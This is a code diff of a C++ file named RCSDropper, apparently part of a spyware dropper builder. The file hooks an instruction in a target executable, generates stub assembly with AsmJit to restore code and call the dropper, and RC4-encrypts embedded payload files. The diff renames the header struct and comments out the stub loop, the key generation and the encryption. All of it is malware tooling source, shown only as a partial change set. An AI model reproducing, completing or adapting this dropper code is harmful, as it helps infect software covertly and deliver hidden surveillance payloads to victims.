@@ -6,6 +6,8 @@
  */
 
 #include "RCSDropper.h"
+#include "../../RCSDropper/DropperHeader.h"
+
 
 #include <algorithm>
 #include <iomanip>
@@ -24,7 +26,7 @@ using namespace std;
 
 #include "Common.h"
 #include "CookerVersion.h"
-#include "DropperHeader.h"
+//#include "DropperHeader.h"
 #include "hook.h"
 
 static void rc4crypt(
@@ -58,7 +60,7 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
     }
     
     // save original code
-    DropperHeader* h = header();
+    DataSectionHeader* h = header();
     h->stage1.VA = hookedInstruction_.d.VirtualAddr;
     h->stage1.size = stub.codeSize();
     h->stage1.offset = offset_.stage1 - offset_.header; // offsets are header based here
@@ -71,7 +73,7 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
 
 std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     unsigned char* restore = ptr_(offset_.restore);
-    DropperHeader* h = NULL;
+    DataSectionHeader* h = NULL;
     DWORD headerVA, dropperVA, stage1VA;
     
     if (currentVA == 0) {
@@ -81,7 +83,7 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     } else {
         h = header();
         headerVA = currentVA + offset_.header;
-        dropperVA = headerVA + sizeof (DropperHeader);
+        dropperVA = headerVA + sizeof (DataSectionHeader) + 8;
         stage1VA = h->stage1.VA;
 
         DEBUG_MSG(D_VERBOSE, "Current  VA : %08x", currentVA);
@@ -106,6 +108,7 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     stub.nop();
     stub.pushad();
     stub.nop();
+/*
     stub.push(headerVA);
 
     stub.pop(AsmJit::eax);
@@ -116,6 +119,7 @@ stub.bind(start_loop);
     stub.cmp(AsmJit::ebx, 0x2e312e32);
     stub.jne(start_loop);
     stub.push(AsmJit::eax);
+*/
 
     stub.nop();
     stub.call(((DWORD) restore) + (dropperVA - currentVA));
@@ -152,7 +156,7 @@ void RCSDropper::generateKey() {
     boost::uniform_smallint<> uni_dist(0, 255);
     boost::variate_generator<boost::mt19937&, boost::uniform_smallint<> > uni(rng, uni_dist);
 
-    DropperHeader* h = header();
+    DataSectionHeader* h = header();
     for (int i = 0; i < RC4KEYLEN; ++i)
         h->rc4key[i] = static_cast<unsigned short int> (uni());
 
@@ -163,7 +167,7 @@ void RCSDropper::generateKey() {
 }
 
 void RCSDropper::encrypt() {
-    DropperHeader* h = header();
+    DataSectionHeader* h = header();
 
     // TODO encrypt files
     DEBUG_MSG(D_DEBUG, "Encrypting core           ... %d", (DWORD) h->files.core.size);
@@ -187,7 +191,7 @@ void RCSDropper::encrypt() {
 
 void RCSDropper::encryptFile_(DataSectionCryptoPack& file) {
     if (file.size != 0) {
-        DropperHeader* h = header();
+        DataSectionHeader* h = header();
         rc4crypt(
                 (unsigned char*) h->rc4key,
                 RC4KEYLEN,
@@ -229,12 +233,12 @@ RCSDropper::RCSDropper(const char* filepath) {
         throw InvalidCookerVersion(version, printable_required_cooker_version);
     }
 
-    generateKey();
-    encrypt();
+    //generateKey();
+    //encrypt();
 }
 
 bool RCSDropper::verifyCookerVersion() {
-    DropperHeader* h = header();
+    DataSectionHeader* h = header();
     std::string version = h->version;
     boost::trim_left(version);
     boost::trim_right(version);
@@ -265,6 +269,7 @@ RCSDropper::~RCSDropper() {
     // TODO Auto-generated destructor stub
 }
 
+#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0);
 void rc4crypt(const unsigned char *key, size_t keylen,
         unsigned char *data, size_t data_len) {
     unsigned int i, j, k;
